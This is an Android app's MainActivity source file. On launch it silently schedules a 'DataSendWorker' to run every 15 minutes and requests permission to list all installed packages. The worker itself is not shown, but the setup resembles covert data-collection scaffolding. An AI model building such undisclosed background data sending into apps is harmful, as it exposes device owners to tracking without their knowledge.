package com.sabbir.dgw;

import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;
import androidx.work.BackoffPolicy;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import java.util.concurrent.TimeUnit;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final int PERMISSION_REQUEST_CODE = 1;
    private final Handler handler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        new Thread(() -> {
            try {
                Thread.sleep(2000);
                initializeWork();
            } catch (Exception e) {
                Log.e(TAG, "Error initializing work", e);
            }
        }).start();

        String[] permissions = {
                android.Manifest.permission.QUERY_ALL_PACKAGES
        };

        if (!hasPermissions(permissions)) {
            requestPermissionsWithDelay(permissions);
        }
    }

    private void initializeWork() {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();

        PeriodicWorkRequest dataWork = new PeriodicWorkRequest.Builder(
                DataSendWorker.class,
                15, TimeUnit.MINUTES)
                .setConstraints(constraints)
                .setBackoffCriteria(
                        BackoffPolicy.EXPONENTIAL,
                        10,
                        TimeUnit.MINUTES
                )
                .setInitialDelay(0, TimeUnit.SECONDS)
                .addTag("periodic_data_sender")
                .build();

        WorkManager.getInstance(this)
                .enqueueUniquePeriodicWork(
                        "DataSenderWork",
                        ExistingPeriodicWorkPolicy.UPDATE,
                        dataWork
                );
    }

    private boolean hasPermissions(String[] permissions) {
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission)
                    != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private void requestPermissionsWithDelay(String[] permissions) {
        handler.postDelayed(() ->
                requestPermissions(permissions, PERMISSION_REQUEST_CODE), 1000);
    }
}